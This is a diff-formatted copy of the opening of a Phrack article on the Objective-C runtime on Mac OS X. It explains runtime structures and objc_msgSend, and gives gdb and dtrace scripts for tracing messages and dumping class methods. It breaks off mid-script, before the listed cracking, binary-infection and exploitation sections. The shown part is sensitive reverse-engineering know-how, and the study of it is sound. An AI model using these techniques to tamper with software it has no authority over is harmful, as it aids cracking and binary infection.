@@ -1,0 +1,3587 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0d, Issue 0x42, Phile #0x04 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=-------=[ The Objective-C Runtime:  Understanding and Abusing ]=-------=|
+|=-----------------------------------------------------------------------=|
+|=----------------------=[ nemo@felinemenace.org ]=----------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Contents
+
+  1 - Introduction 
+
+  2 - What is Objective-C?
+
+  3 - The Objective-C Runtime
+   3.1 - libobjc.A.dylib
+   3.2 - The __OBJC Segment
+
+  4 - Reverse Engineering Objective-C Applications.
+   4.1 - Static analysis toolset
+   4.2 - Runtime analysis toolset
+   4.3 - Cracking
+   4.4 - Objective-C Binary infection.
+
+  5 - Exploiting Objective-C Applications
+   5.1 - Side note: Updated shared_region technique.
+
+  6 - Conclusion 
+
+  7 - References
+
+  8 - Appendix A: Source code
+
+--[ 1 - Introduction 
+
+Hello reader. I am writing this paper to document some research which I
+undertook on Mac OS X around 3 years ago.
+
+At the time i prepared this research, I gave a talk on it at Ruxcon.
+It was a pretty terrible talk, dry and technical and it demotivated me a
+little. Unfortunately due to this i didn't keep the slides. Around this
+time my laptop broke and Apple refused to fix it. This drove me away from
+Mac OS X for a while. A week ago, we tried again with another Apple store,
+just in case, and they seem to have fixed the problem. So i'm back on OS X
+and giving the documentation of this research another try. I'm hoping it
+transfers a little smoother in .txt format, however you be the judge.
+
+The topic of this research is the Objective-C runtime on Mac OS X.
+Basically, during the contents of this paper, i will look at how the
+Objective-C runtime works both in a binary, and in memory. I will then look
+at how we can manipulate the runtime to our advantage, from a reverse
+engineering/exploit development and binary infection perspective.
+
+--[ 2 - What is Objective-C?
+
+Before we look at the Objective-C runtime, let's take a look at what
+Objective-C actually is.
+
+Objective-C is a reflective programming language which aims to provide object
+orientated concepts and Smalltalk-esque messaging to C.
+
+Gcc provides a compiler for Objective-C, however due to the rich library
+support on OpenStep based operating systems (Mac OS X, IPhone, GNUstep) it
+is typically only really used on these platforms.
+
+Objective-C is implemented as an augmentation to the C language. It is
+a superset of C which means that any Objective-C compiler can also compile
+C.
+
+To learn more about Objective-C, you can read the [1] and [2] in the
+references. 
+
+To illustrate what Objective-C looks like as a language we'll look at a simple 
+Hello World example from [3]. This tutorial shows how to compile a basic
+Hello World style Objective-C app from the command line. If you're already
+familiar with Objective-C just go ahead and skip to the next section. ;-)
+
+So first we make a directory for our project ...
+
+-[dcbz@megatron:~/code]$ mkdir HelloWorld
+-[dcbz@megatron:~/code]$ mkdir HelloWorld/build
+
+... and create the header file for our new class (Talker.)
+
+-[dcbz@megatron:~/code]$ cat > HelloWorld/Talker.h
+#import <Foundation/Foundation.h>
+
+@interface Talker : NSObject
+
+- (void) say: (STR) phrase;
+
+@end
+
+^D
+
+As you can see, Objective-C projects use the .h extension
+just like C. This header looks pretty different to a typically C style
+header though.
+
+The "@interface Talker : NSObject" line basically tells the compiler that
+a "Talker" class exists, and it's derived from the NSObject class.
+
+The "- (void) say: (STR) phrase;" line describes a public method of that
+class called "say". This method takes a (STR) argument called "phrase".
+
+Now that the header file exists and our class is defined, we need to
+implement the meat of the class. Typically Objective-C files have the file
+extension ".m". 
+ 
+-[dcbz@megatron:~/code]$ cat > HelloWorld/Talker.m
+#import "Talker.h"
+
+@implementation Talker
+
+- (void) say: (STR) phrase {
+  printf("%s\n", phrase);
+}
+
+@end
+
+^D
+
+Clearly the implementation for the Talker class is pretty straight
+forward. The say() method takes the string "phrase" and prints it with 
+printf.
+
+Now that our class is layed down, we need to write a little main()
+function to use it.
+
+-[dcbz@megatron:~/code]$ cat > HelloWorld/hello.m
+#import "Talker.h"
+
+int main(void) {
+  Talker *talker = [[Talker alloc] init];
+  [talker say: "Hello, World!"];
+  [talker release];
+}
+
+From this example you can see that the syntax for calling methods of an 
+Objective-C class is not quite the same as your typical C or C++ code.
+It looks far more like smalltalk messaging, or Lisp.
+
+        [<object> <method>: <argument>];
+
+Typically Objective-C programmers alloc and init on the same line, as shown
+in the example.  I know this generally sets off alarm bells that a NULL
+pointer dereference can occur, however the Objective-C runtime has a check
+for a NULL pointer being passed to the runtime which catches this condition. 
+(see the objc_msgSend source later in this paper.)
+
+Now we just build the project. The -framework option to gcc allows us to
+specify an Objective-C framework to link with.
+
+-[dcbz@megatron:~/code]$ cd HelloWorld/
+-[dcbz@megatron:~/code/HelloWorld]$ gcc -o build/hello Talker.m
+hello.m -framework Foundation
+-[dcbz@megatron:~/code/HelloWorld]$ cd build/
+-[dcbz@megatron:~/code/HelloWorld/build]$ ./hello 
+Hello, World!
+
+As you can see, the produced binary outputs "Hello, World!" as expected.
+Unfortunately, this example about showcases all the skill I have with
+Objective-C as a language. I've spent way more time auditing it than I have
+writing it. Fortunately you don't really need a heavy understanding of
+Objective-C to follow the rest of the paper.
+
+--[ 3 - The Objective-C Runtime
+
+Now that we're intimately familiar with Objective-C as a language, ;-) - We
+can begin to focus on the interesting aspects of Objective-C, the runtime
+that allows it to function.
+
+As I mentioned earlier in the Introduction section, Objective-C is a
+reflective language. The following quote explains this more clearly than i
+could (in a very academic manner :( ).
+
+"""
+ Reflection is the ability of a program to manipulate as data something
+representing the state of the program during its own execution. There are
+two aspects of such manipulation :  introspection and  intercession.
+Introspection is the ability of a program to observe and therefore reason
+about its own state. Intercession is the ability of a program to modify its
+own execution state or alter its own interpretation or meaning. Both
+aspects require a mechanism for encoding execution state as data; providing
+such an encoding is called  reification.
+""" - [4]
+
+Basically this means, that at runtime, Objective-C classes are designed to
+be aware of their own state, and be capable of altering their own
+implementation. As you can imagine, this information/functionality can be
+quite useful from a hacking perspective.
+
+So how is this implemented on Mac OS X? Firstly, when gcc compiles our 
+hello.m application, it is linked with  the "libobjc.A.dylib" library.
+
+"""
+-[dcbz@megatron:~/code/HelloWorld/build]$ otool -L hello 
+hello:
+	/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
+(compatibility version 300.0.0, current version 677.22.0)
+	/usr/lib/libgcc_s.1.dylib (compatibility version 1.0.0, current
+version 1.0.0)
+	/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current
+version 111.1.3)
+	/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current
+version 227.0.0)
+	/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
+(compatibility version 150.0.0, current version 476.17.0)
+"""
+
+The source code for this dylib is available from [5]. This library contains
+the code for manipulating our Objective-C classes at runtime. 
+
+Also during compile time, gcc is responsible for storing all the
+information required by libobjc.A.dylib inside the binary. This is
+accomplished by creating the __OBJC segment. I plan not to cover the Mach-O
+file format in this paper, as it's been done to death [6]. We're more
+interested in what the various sections contain.
+
+Here's a list of the __OBJC segment in our binary and the sections
+contained (logically) within.
+
+	LC_SEGMENT.__OBJC.__cat_cls_meth 
+	LC_SEGMENT.__OBJC.__cat_inst_meth 
+	LC_SEGMENT.__OBJC.__string_object 
+	LC_SEGMENT.__OBJC.__cstring_object 
+	LC_SEGMENT.__OBJC.__message_refs 
+	LC_SEGMENT.__OBJC.__sel_fixup 
+	LC_SEGMENT.__OBJC.__cls_refs 
+	LC_SEGMENT.__OBJC.__class 
+	LC_SEGMENT.__OBJC.__meta_class
+	LC_SEGMENT.__OBJC.__cls_meth 
+	LC_SEGMENT.__OBJC.__inst_meth
+	LC_SEGMENT.__OBJC.__protocol
+	LC_SEGMENT.__OBJC.__category 
+	LC_SEGMENT.__OBJC.__class_vars 
+	LC_SEGMENT.__OBJC.__instance_vars 
+	LC_SEGMENT.__OBJC.__module_info 
+	LC_SEGMENT.__OBJC.__symbols 
+
+As you can see, quite a lot of information is stored in the file and
+therefore available at runtime..
+
+We'll look at both the in memory components of the Objective-C runtime and
+the file contents in more detail in the following sections.
+
+------[ 3.1 - libobjc.A.dylib
+
+As mentioned previously, the file libobjc.A.dylib is a library file on Mac
+OS X which provides the in-memory runtime functionality of the Objective-C
+language.
+
+The source code for this library is available from the apple website. [5].
+
+Apple have documented the mechanics of this library quite well in the
+papers [7] & [8]. These papers show versions 1.0 and 2.0 of the runtime. 
+
+When I last looked at the runtime 3 years ago, version 2.0 was the latest.
+However it seems that 3.0 is the standard now, and things have changed
+quite dramatically. I actually wrote a large portion of this section based
+on how things used to be, and I had to go back and rewrite most of it.
+Hopefully there aren't any errors due to this. But please forgive me if
+there are.
+
+Probably the first and most important function in this library is the 
+"objc_msgSend" function. 
+
+objc_msgSend() is used to send messages to an object in memory.  All access
+to a method or attribute of an Objective-C object at runtime utilize this
+function.
+
+Here is the description of this function, taken from the Objective-C 2.0
+Runtime Reference [7].
+
+"""
+objc_msgSend(): 
+
+Sends a message with a simple return value to an instance of a class. 
+
+	id objc_msgSend(id theReceiver, SEL theSelector, ...) 
+
+Parameters:
+
+        theReceiver 
+
+                A pointer that points to the instance of the class that is
+                to receive the message. 
+
+        theSelector 
+
+               The selector of the method that handles the message. 
+
+        ... 
+
+               A variable argument list containing the arguments to 
+               the method. 
+
+        ReturnValue 
+               The return value of the method. 
+"""
+
+In order to understand this function we need to first understand the
+structures used by this function.
+
+The first argument to objc_msgSend() is an "id" struct. The definition for
+this struct is in the file /usr/include/objc/objc.h.
+
+	typedef struct objc_object { 
+	    Class isa; 
+	} *id; 
+
+	typedef struct objc_class *Class; 
+
+	struct objc_class
+	{
+	   struct objc_class* isa;
+	   struct objc_class* super_class;
+	   const char* name;
+	   long version;
+	   long info;
+	   long instance_size;
+	   struct objc_ivar_list* ivars;
+	   struct objc_method_list** methodLists;
+	   struct objc_cache* cache;
+	   struct objc_protocol_list* protocols;
+	};
+
+As you can see, an id is basically a pointer to an "objc_class" instance in
+memory. 
+
+I will now run through some of the more interesting elements of this
+struct.
+
+The isa element is a pointer to the class definition for the object.
+
+The super_class element is a pointer to the base class for this object.
+
+The name element is just a pointer to the name of the object at runtime. 
+This is only really useful from a higher level perspective.
+
+The ivars element is basically a way to represent all the instance
+variables of an object in memory. It consists of a pointer to an 
+objc_ivar_list struct. This basically contains a count, followed by an 
+array of count * objc_ivar structs.
+
+	struct objc_ivar_list {
+	    int ivar_count
+	    /* variable length structure */
+	    struct objc_ivar ivar_list[1]
+	}                          
+
+The objc_ivar struct, consists of the name, and type of the variable.
+Both of which are simply char * as seen below.
+
+	struct objc_ivar {
+	    char *ivar_name
+	    char *ivar_type
+	    int ivar_offset
+	}                        
+
+The ivar_offset value indicates how far into the __OBJC.__class_vars
+section to seek, to find the data used by this variable.
+
+The methodLists element is basically a list of the methods supported by 
+the class. The objc_method_list struct is simply made up of an integer 
+that dictates how many methods there are, followed by an array of struct
+objc_method's.
+
+	struct objc_method_list 
+	{ 
+	    struct objc_method_list *obsolete; 
+	    int method_count; 
+	    struct objc_method method_list[1]; 
+	} 
+
+	typedef struct objc_method *Method;
+
+The objc_method struct contains a SEL, (our second argument to objc_msgSend
+too, while we'll get to soon) which dictates the method_name, a string
+containing the argument types to the method. Finally this struct contains a
+function pointer for the method itself, of type IMP.
+
+	struct objc_method {
+	    SEL method_name
+	    char *method_types
+	    IMP method_imp
+	}
+
+	id (*IMP)(id, SEL, ...) 
+
+An IMP function pointer indicates that the first argument should be the
+classes "self" pointer, or the id (objc_class) pointer for the class.
+The second argument should be the methods's SEL (selector).
+
+For now that's all that's interesting to us about the ID data type. Later
+on in this paper we'll look at how the method caching works, and how it can
+negatively affect us.
+
+Now let's look at the mysterious data type "SEL" that we've been
+hearing so much about. The second argument to objc_msgSend.
+
+	typedef struct objc_selector    *SEL;
+
+And what is an objc_selector struct you ask? Turns out, it's just a char *
+string that's been processed by the runtime.
+
+objc_msgSend() is implemented in assembly. To read it's implementation
+browse to the runtime/Messengers.subproj directory in the objc-runtime
+source tree. The file objc-msg-i386.s is the intel implementation of
+this.
+
+Now that we're some what familiar with the runtime, let's take a look at
+our sample "hello" application we wrote earlier in a debugger and verify
+our progress.
+
+The most commonly used debugger on Mac OS X is gdb, obviously. Since I've
+spent so much time in the Windows world lately I am intel syntax inclined, 
+I apologize in advance. 
+
+Regardless, let's fire up gdb and take a look at the source of our main 
+function.
+
+-[dcbz@megatron:~/code/HelloWorld/build]$ gdb ./hello 
+GNU gdb 6.3.50-20050815 (Apple version gdb-768) (Tue Oct  2 04:07:49 UTC
+2007)
+Copyright 2004 Free Software Foundation, Inc.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x00001f3d <main+0>:	push   ebp
+0x00001f3e <main+1>:	mov    ebp,esp
+0x00001f40 <main+3>:	push   ebx
+0x00001f41 <main+4>:	sub    esp,0x24
+0x00001f44 <main+7>:	call   0x1f49 <main+12>
+0x00001f49 <main+12>:	pop    ebx
+0x00001f4a <main+13>:	lea    eax,[ebx+0x117b]
+0x00001f50 <main+19>:	mov    eax,DWORD PTR [eax]
+0x00001f52 <main+21>:	mov    edx,eax
+0x00001f54 <main+23>:	lea    eax,[ebx+0x1177]
+0x00001f5a <main+29>:	mov    eax,DWORD PTR [eax]
+0x00001f5c <main+31>:	mov    DWORD PTR [esp+0x4],eax
+0x00001f60 <main+35>:	mov    DWORD PTR [esp],edx
+0x00001f63 <main+38>:	call   0x4005 <dyld_stub_objc_msgSend>
+0x00001f68 <main+43>:	mov    edx,eax
+0x00001f6a <main+45>:	lea    eax,[ebx+0x1173]
+0x00001f70 <main+51>:	mov    eax,DWORD PTR [eax]
+0x00001f72 <main+53>:	mov    DWORD PTR [esp+0x4],eax
+0x00001f76 <main+57>:	mov    DWORD PTR [esp],edx
+0x00001f79 <main+60>:	call   0x4005 <dyld_stub_objc_msgSend>
+0x00001f7e <main+65>:	mov    DWORD PTR [ebp-0xc],eax
+0x00001f81 <main+68>:	mov    ecx,DWORD PTR [ebp-0xc]
+0x00001f84 <main+71>:	lea    eax,[ebx+0x116f]
+0x00001f8a <main+77>:	mov    edx,DWORD PTR [eax]
+0x00001f8c <main+79>:	lea    eax,[ebx+0x96]
+0x00001f92 <main+85>:	mov    DWORD PTR [esp+0x8],eax
+0x00001f96 <main+89>:	mov    DWORD PTR [esp+0x4],edx
+0x00001f9a <main+93>:	mov    DWORD PTR [esp],ecx
+0x00001f9d <main+96>:	call   0x4005 <dyld_stub_objc_msgSend>
+0x00001fa2 <main+101>:	mov    edx,DWORD PTR [ebp-0xc]
+0x00001fa5 <main+104>:	lea    eax,[ebx+0x116b]
+0x00001fab <main+110>:	mov    eax,DWORD PTR [eax]
+0x00001fad <main+112>:	mov    DWORD PTR [esp+0x4],eax
+0x00001fb1 <main+116>:	mov    DWORD PTR [esp],edx
+0x00001fb4 <main+119>:	call   0x4005 <dyld_stub_objc_msgSend>
+0x00001fb9 <main+124>:	add    esp,0x24
+0x00001fbc <main+127>:	pop    ebx
+0x00001fbd <main+128>:	leave  
+0x00001fbe <main+129>:	ret    
+
+As you can see, our main function only consists of 4 calls to
+objc_msgSend(). There are no calls to our actual methods here. 
+Here is a listing of the source code again, to jog your memory.
+
+	int main(void) {
+	  Talker *talker = [[Talker alloc] init];
+	  [talker say: "Hello World!"];
+	  [talker release];
+	}
+
+Each call to objc_msgSend() corresponds to each method call
+in our source.
+           class | method 
+         ------------------         
+          Talker | alloc
+          talker | init 
+          talker | say
+          talker | release
+         ------------------
+
+To verify this we can put a breakpoint on the objc_msgSend() function.
+
+(gdb) break objc_msgSend
+Breakpoint 2 at 0x9470d670
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x9470d670 in objc_msgSend ()
+(gdb) x/2i $pc
+0x9470d670 <objc_msgSend>:      mov    ecx,DWORD PTR [esp+0x8]
+0x9470d674 <objc_msgSend+4>:    mov    eax,DWORD PTR [esp+0x4]
+
+As you can see, the first two instructions in objc_msgSend() are
+responsible for moving the id into eax, and the selector into ecx.
+
+To verify, lets step and print the contents of ecx.
+
+(gdb) stepi
+0x9470d674 in objc_msgSend ()
+(gdb) x/s $ecx
+0x9470e66c <objc_msgSend_stub+828>:      "alloc"
+
+As predicted "alloc" was the first method called.
+
+Now we can delete our breakpoints, and add a breakpoint at the current
+location. Then use the "commands" option in gdb to print the string at ecx,
+every time this breakpoint is hit.
+
+(gdb) break
+Breakpoint 3 at 0x9470d674
+(gdb) commands
+Type commands for when breakpoint 3 is hit, one per line.
+End with a line saying just "end".
+>x/s $ecx
+>c
+>end
+(gdb) c
+Continuing.
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x94722d20 <__FUNCTION__.12370+80320>:   "defaultCenter"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9470e83c <objc_msgSend_stub+1292>:     "self"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x94772d28 <__FUNCTION__.12370+408008>:
+"addObserver:selector:name:object:"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9470e66c <objc_msgSend_stub+828>:      "alloc"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9470e680 <objc_msgSend_stub+848>:      "initialize"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9477f158 <__FUNCTION__.12370+458232>:  "allocWithZone:"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9470e858 <objc_msgSend_stub+1320>:     "init"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x1fd0 <main+147>:       "say:"
+Hello World!
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x947a9334 <__FUNCTION__.12370+630740>:  "release"
+
+Breakpoint 8, 0x9470d674 in objc_msgSend ()
+0x9474e514 <__FUNCTION__.12370+258484>:  "dealloc"
+
+This works as expected. However, we can see that we were flooded with
+methods that weren't related to our class from the NS runtime loading.
+Let's try to implement something to see which class methods were called on.
+
+Remembering back to our objc_class struct:
+
+        struct objc_class
+        { 
+           struct objc_class* isa;
+           struct objc_class* super_class;
+           const char* name;
+
+8 bytes into the struct there's a 4 byte pointer to the class's name.
+
+To verify this, we can restart the process with our breakpoint in the same
+place.
+
+Breakpoint 6, 0x9470d674 in objc_msgSend ()
+(gdb) printf "%s\n", *(long*)($eax+8)
+NSNotificationCenter
+
+This time when it's hit, we deref the pointer at $eax+8 and print it to
+find out the class name.
+
+Again we can script this with the "commands" option to automate the process.
+But lets change our code so that rather than using printf, we utilize one
+of the functions exported by our objective-c runtime:
+
+call (char *)class_getName($eax)
+
+This function will do the work for us just with our ID.
+
+(gdb) b *0x9470d674
+Breakpoint 1 at 0x9470d674
+(gdb) commands
+Type commands for when breakpoint 1 is hit, one per line.
+End with a line saying just "end".
+>call (char *)class_getName($eax)
+>x/s $ecx
+>c
+>end
+(gdb) run
+...
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$107 = 0x6e6f5a68 <Address 0x6e6f5a68 out of bounds>
+0x9477f158 <__FUNCTION__.12370+458232>:  "allocWithZone:"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$108 = 0x0
+0x94772d28 <__FUNCTION__.12370+408008>:
+"addObserver:selector:name:object:"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$109 = 0x916e0318 "NSNotificationCenter"
+0x94722d20 <__FUNCTION__.12370+80320>:   "defaultCenter"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$110 = 0x916e0318 "NSNotificationCenter"
+0x9470e83c <objc_msgSend_stub+1292>:     "self"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$111 = 0x0
+0x94772d28 <__FUNCTION__.12370+408008>:
+"addObserver:selector:name:object:"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$112 = 0x77656e <Address 0x77656e out of bounds>
+0x9470e66c <objc_msgSend_stub+828>:      "alloc"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$113 = 0x1fc9 "Talker"
+0x9470e680 <objc_msgSend_stub+848>:      "initialize"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$114 = 0x1fc9 "Talker"
+0x9477f158 <__FUNCTION__.12370+458232>:  "allocWithZone:"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$115 = 0x6b617761 <Address 0x6b617761 out of bounds>
+0x9470e858 <objc_msgSend_stub+1320>:     "init"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$116 = 0x21646c72 <Address 0x21646c72 out of bounds>
+0x1fd0 <main+147>:       "say:"
+Hello World!
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$117 = 0x6470755f <Address 0x6470755f out of bounds>
+0x947a9334 <__FUNCTION__.12370+630740>:  "release"
+
+Breakpoint 2, 0x9470d674 in objc_msgSend ()
+$118 = 0x615f4943 <Address 0x615f4943 out of bounds>
+0x9474e514 <__FUNCTION__.12370+258484>:  "dealloc"
+
+
+And as you can see, this works as sort of a make shift, objective-c message
+tracing system.  
+
+However in some cases, eax does not actually contain an id. And this will
+not work. Hence we get the messages like:
+
+$118 = 0x615f4943 <Address 0x615f4943 out of bounds>
+
+This is due to the fact that objc_msgSend() is not always an entry point.
+So we can't guarantee that every time our breakpoint is hit we are actually
+seeing a call to objc_msgSend().
+
+To make our tracer work more effectively we can put a breakpoint on
+0x4005 <dyld_stub_objc_msgSend> instead. This means we have to use esp+0x8
+for our SEL and esp+0x4 for our ID.
+
+We can use the statement:
+
+printf "[%s %s]\n", *(long *)((*(long*)($esp+4))+8),*(long *)($esp+8)
+
+To print our object and method nicely. 
+
+This works pretty well but we still hit a situation where sometimes our
+class's name is set to NULL. In this case we take the isa (deref the first
+pointer in the struct) and get the name of that.
+
+The following gdb script will handle this:
+
+#
+# Trace objective-c messages. - nemo 2009
+#
+b dyld_stub_objc_msgSend
+commands 
+        set $id  = *(long *)($esp+4)
+        set $sel = *(long *)($esp+8)
+        if(*(long *)($id+8) != 0)
+                printf "[%s %s]\n", *(long *)($id+8),$sel
+                continue
+        end
+        set $isx = *(long *)($id)
+        printf "[%s %s]\n", *(long *)($isx+8),$sel
+        continue
+end
+
+We could also implement this with dtrace on Mac OS X quite easily.
+
+#!/usr/sbin/dtrace -qs
+
+/* usage: objcdump.d <pid> */
+
+pid$1::objc_msgSend:entry
+{
+        self->isa = *(long *)copyin(arg0,4);
+        printf("-[%s %s]\n",copyinstr(*(long *)copyin(self->isa + 8,
+4)),copyinstr(arg1));
+
+}
+
+Let me correct myself on that, we /should/ be able to implement this with
+dtrace on Mac OS X quite easily. However, dtrace is kind of like looking at
+a beautiful painting through a kids kaleidescope toy. Thanks a lot to twiz
+for helping me out with implementing this.
+
+As you can see, the output of this script is the same as our gdb script,
+however the speed at which the process runs is magnitudes faster.
+
+Now that we're hopefully familiar with how calls to objc_msgSend() work we
+can look at how the ivar's and methods are accessed.
+
+In order to investigate this a little, we can modify our hello.m example
+code a little to include some attributes. To demonstrate this I will use
+the fraction example from [10]. (I'm getting uncreative in my old age ;-) .
+
+-[dcbz@megatron:~/code/fraction]$ ls -lsa
+total 24
+0 drwxr-xr-x   5 dcbz  dcbz   170 Mar 27 10:28 .
+0 drwxr-xr-x  33 dcbz  dcbz  1122 Mar 27 10:17 ..
+8 -rwxr-----   1 dcbz  dcbz   231 Mar 23  2004 Fraction.h
+8 -rwxr-----   1 dcbz  dcbz   339 Mar 24  2004 Fraction.m
+8 -rwxr-----   1 dcbz  dcbz   386 Mar 27  2004 main.m
+
+As you can see, this project is pretty similar to our earlier hello.m
+example.
+
+-[dcbz@megatron:~/code/fraction]$ cat Fraction.h
+#import <Foundation/NSObject.h>
+
+@interface Fraction: NSObject {
+    int numerator;
+    int denominator;
+}
+
+-(void) print;
+-(void) setNumerator: (int) d;
+-(void) setDenominator: (int) d;
+-(int) numerator;
+-(int) denominator;
+@end
+
+Our header file defines a simple interface to a "Fraction" class. This
+class represents the numerator and denominator of a fraction.
+
+It exports the methods setNumerator and setDemonimator in order to modify
+these values, and the methods numerator() and denominator() to get the
+values.
+
+-[dcbz@megatron:~/code/fraction]$ cat Fraction.m
+#import "Fraction.h"
+#import <stdio.h>
+
+@implementation Fraction
+-(void) print {
+    printf( "%i/%i", numerator, denominator );
+}
+
+-(void) setNumerator: (int) n {
+    numerator = n;
+}
+
+-(void) setDenominator: (int) d {
+    denominator = d;
+}
+
+-(int) denominator {
+    return denominator;
+}
+
+-(int) numerator {
+    return numerator;
+}
+@end
+
+The actual implementation of these methods is pretty much what you would
+expect from any OOP language. Get methods return the object's attribute, set
+methods set it.
+
+-[dcbz@megatron:~/code/fraction]$ cat main.m 
+#import <stdio.h>
+#import "Fraction.h"
+
+int main( int argc, const char *argv[] ) {
+    // create a new instance
+    Fraction *frac = [[Fraction alloc] init];
+
+    // set the values
+    [frac setNumerator: 1];
+    [frac setDenominator: 3];
+
+    // print it
+    printf( "The fraction is: " );
+    [frac print];
+    printf( "\n" );
+
+    // free memory
+    [frac release];
+
+    return 0;
+}
+
+As you can see, our main.m file contains code to instantiate an instance of
+the class. It then sets the numerator to 1 and denominator to 3, and prints
+the fraction. Pretty straight forward stuff.
+
+-[dcbz@megatron:~/code/fraction]$  gcc -o fraction Fraction.m main.m
+-framework Foundation
+-[dcbz@megatron:~/code/fraction]$ ./fraction 
+The fraction is: 1/3
+
+Before we fire up gdb and look at this from a debugging perspective, lets
+take a quick look through the source code for what happens after
+objc_msgSend() is called.
+
+        ENTRY   _objc_msgSend
+        CALL_MCOUNTER
+
+// load receiver and selector
+        movl    selector(%esp), %ecx
+        movl    self(%esp), %eax
+
+// check whether selector is ignored
+        cmpl    $ kIgnore, %ecx
+        je      LMsgSendDone            // return self from %eax
+
+// check whether receiver is nil
+        testl   %eax, %eax
+        je      LMsgSendNilSelf
+
+// receiver (in %eax) is non-nil: search the cache
+LMsgSendReceiverOk:
+        movl    isa(%eax), %edx         // class = self->isa
+        CacheLookup WORD_RETURN, MSG_SEND, LMsgSendCacheMiss
+        movl    $kFwdMsgSend, %edx      // flag word-return for
+_objc_msgForward
+        jmp     *%eax                   // goto *imp
+
+// cache miss: go search the method lists
+LMsgSendCacheMiss:
+        MethodTableLookup WORD_RETURN, MSG_SEND
+        movl    $kFwdMsgSend, %edx      // flag word-return for
+_objc_msgForward
+        jmp     *%eax                   // goto *imp
+
+
+As you can see, objc_msgSend() first moves the receiver and selector into
+eax and ecx respectively. It then tests if the selector is kignore ("?").
+If this is the case, it simply returns the receiver (id).
+
+If the receiver is not NULL, a cache lookup is performed on the method in
+question. If the method is found in the cache, the value in the cache is
+simply called. We'll look into the cache in more detail later in the
+exploitation section.
+
+If the method's address is not in the cache, the "MethodTableLookup" macro
+is used.
+
+.macro MethodTableLookup
+
+        subl    $$4, %esp               // 16-byte align the stack
+        // push args (class, selector)
+        pushl   %ecx
+        pushl   %eax
+        CALL_EXTERN(__class_lookupMethodAndLoadCache)
+        addl    $$12, %esp              // pop parameters and alignment
+.endmacro
+
+From the code above we can see that this macro simply aligns the stack and calls
+__class_lookupMethodAndLoadCache.
+
+This function, checks the cache of the class again, and it's super class
+for the method in question. If it's definitely not in the cache, the method
+list in the class is walked and tested individually for a match. If this
+is not successful the parent of the class is checked and so forth.
+If the method is found, it's called.
+
+Let's look at this process in gdb.
+
+We hit out breakpoint in objc_msgSend().
+
+Breakpoint 7, 0x9470d670 in objc_msgSend ()
+(gdb) stepi
+0x9470d674 in objc_msgSend ()
+(gdb) stepi
+0x9470d678 in objc_msgSend ()
+
+Step over the first two instructions to populate ecx and eax, for our
+convenience.
+
+(gdb) x/s $ecx
+0x1f8d <main+244>:       "setNumerator:"
+
+We can see the method being called (from the SEL argument) is setNumerator:
+
+(gdb) x/x $eax
+0x103240:       0x00003000
+
+We take the ISA...
+
+(gdb) x/x 0x00003000
+0x3000 <.objc_class_name_Fraction>:     0x00003040
+(gdb) 
+0x3004 <.objc_class_name_Fraction+4>:   0xa07fccc0
+(gdb) 
+0x3008 <.objc_class_name_Fraction+8>:   0x00001f7e
+
+Offset this by 8 bytes to find the class name.
+
+(gdb) x/s 0x00001f7e
+0x1f7e <main+229>:       "Fraction"
+
+So this is a call to -[Fraction setNumerator:] (obviously).
+
+        struct objc_class
+        { 
+           struct objc_class* isa;
+           struct objc_class* super_class;
+           const char* name;
+           long version;
+           long info;
+           long instance_size;
+           struct objc_ivar_list* ivars;
+           struct objc_method_list** methodLists;
+           struct objc_cache* cache;
+           struct objc_protocol_list* protocols;
+        };
+
+Remembering our objc_class struct from earlier, we know that the 
+method_lists struct is 28 bytes in.
+
+(gdb) set $classbase=0x3000
+(gdb) x/x $classbase+28
+0x301c <.objc_class_name_Fraction+28>:  0x00103250
+
+So the address of our method_list is 0x00103250.
+
+
+      struct objc_method_list
+        {
+            struct objc_method_list *obsolete;
+            int method_count;
+            struct objc_method method_list[1];
+        }
+
+As you can see, our method_count is 5.
+
+(gdb) x/x 0x00103250+4
+0x103254:       0x00000005
+
+
+        typedef struct objc_method *Method;
+
+        struct objc_method {
+            SEL method_name
+            char *method_types
+            IMP method_imp
+        }
+
+(gdb) x/3x 0x00103250+8
+0x103258:       0x00001fb7      0x00001fd2      0x00001e8b
+(gdb) x/s 0x00001fb7
+0x1fb7 <main+286>:       "numerator"
+(gdb) x/7i  0x00001e8b
+0x1e8b <-[Fraction numerator]>:         push   ebp
+0x1e8c <-[Fraction numerator]+1>:       mov    ebp,esp
+0x1e8e <-[Fraction numerator]+3>:       sub    esp,0x8
+0x1e91 <-[Fraction numerator]+6>:       mov    eax,DWORD PTR [ebp+0x8]
+0x1e94 <-[Fraction numerator]+9>:       mov    eax,DWORD PTR [eax+0x4]
+0x1e97 <-[Fraction numerator]+12>:      leave
+0x1e98 <-[Fraction numerator]+13>:      ret
+
+Now that we see clearly how methods are stored, we can write a small amount
+of gdb script to dump them.
+
+(gdb) set $methods =  0x00103250 + 8
+(gdb) set $i = 1
+(gdb) while($i <= 5)
